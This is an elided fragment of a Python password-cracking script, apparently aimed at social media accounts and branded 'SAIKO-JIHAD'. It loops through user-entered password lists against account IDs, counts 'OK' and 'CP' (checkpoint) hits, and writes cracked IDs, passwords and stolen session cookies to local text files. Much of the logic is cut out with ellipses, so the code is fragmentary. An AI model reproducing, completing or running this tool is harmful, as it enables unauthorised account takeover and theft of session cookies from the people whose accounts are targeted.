...
try:
	...
	#os.system(git clone 'https://github.com/SAIKO-KING/EHC-PAID08/commit/3972cfc401acaf40820b84c9207750ed7fe8a640')
...
""")
	...
	sai = []
	if csp in ['y','Y','yes','Yes','JIHAD']:
		psx = int(input(" Enter Password Limit: JIHAD "))
		for sa in range(psx):
			pww = input(f"{so} Enter Password: JIHAD ")
			sai.append(pww)
	else:
		pass
...
def c(uid,pwx,ln):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r%s[🆂🅰🅸🅺🅾-🅹🅸🅷🅰🅳] [%s/%s] [OK-%s] [CP-%s] \r'%(wa,loop,ln,len(oks),len(cps))),
            sys.stdout.flush()
         ...
         #   log_cookies=session.cookies.get_dict().keys()
            ...
            #	botok(uid,ps)
            	...
            	cid = coki[65:80]
            	print('\033[1;92m🅹🅸🅷🅰🅳-OK[😁]\033[1;92m] \033[1;92m' +cid+ ' | ' +ps+    ' |>>'+tahunng(cid))
            	print('\033[1;92m[\033[1;92m😈\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
            	open('🅹🅸🅷🅰🅳-OK.txt', 'a').write( cid+' | '+ps+'\n')
            	open('🅹🅸🅷🅰🅳-coki.txt', 'a').write(coki+'\n')
            	...
            	coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
            	cid = coki[82:97]
            	print('\33[1;30m(🅹🅸🅷🅰🅳-Cp [💔] '+cid+ ' | ' +ps+'  |>>'+tahunng(cid))
